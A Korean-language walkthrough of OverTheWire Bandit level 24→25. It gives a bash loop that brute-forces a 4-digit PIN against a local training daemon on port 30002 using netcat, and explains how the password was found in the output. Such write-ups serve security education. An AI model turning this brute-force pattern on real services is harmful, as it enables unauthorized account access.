# Level 24 → 25

## 1. 목표 (Objective)
30002 포트를 통해 bandit25 비밀번호 얻기
### 조건
- 현재 비밀번호와 숫자 4자리를 입력
- Brute Force

## 2. 사용 명령어 (Commands)
`mktemp`, `vi`, `chmod`, `tail`

## 3. 풀이 과정 (Procedure)
1. `mktemp -d` 실행 → `cd {경로}` 실행
2. `vi {파일명.sh}` 실행
    ```shell
    #!/bin/bash
    for i in {0000..9999}; do
        echo "현재비밀번호 $i"
    done | nc localhost 30002 > result.txt
    ```
3. `chmod 777 {파일명.sh}` 실행
4. `./{파일명.sh}` 실행
5. `ls -al` 실행 → `22200 Oct 24 08:27 result.txt` 생성 완료
6. `tail result.txt` 실행

## 4. 원리 (Theory)
- `tail`
  - 파일의 마지막 일부만 보여주는 명령어
  - 파일의 용량으로 인해 많은 양이 있을 것으로 판단해 `grep -v` 사용해서 피할 단어를 찾을 목적으로 실행했지만 결과가 연결이 끊긴 지점에 비밀번호가 존재

---
[← 목차로](./README.md)